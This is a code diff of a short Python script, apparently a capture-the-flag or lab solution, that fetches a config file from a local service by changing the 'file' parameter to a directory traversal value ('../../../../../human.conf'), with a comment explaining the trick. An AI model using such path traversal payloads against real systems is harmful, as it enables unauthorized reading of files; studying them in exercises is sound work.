@@ -7,15 +7,14 @@
 #
 # Note: The script can timeout if this occurs try narrowing
 # down your search
-url = 'http://127.0.0.1:8082/humantechconfig?file=human.conf'
+url = 'http://127.0.0.1:8082/humantechconfig?file=../../../../../human.conf'
 import urllib, urllib2, os
 
 page = urllib2.urlopen(url).read()
-#print(page)
+print(page)
 
-rootDir = '.'
-for dirName, subdirList, fileList in os.walk(rootDir, topdown=False):
-    print('Found directory: %s' % dirName)
-    for fname in fileList:
-        print('\t%s' % fname)
-        
+"""
+solved this through guess and check
+original url ended in file=human.conf
+adding ../ goes to the parent directory
+"""
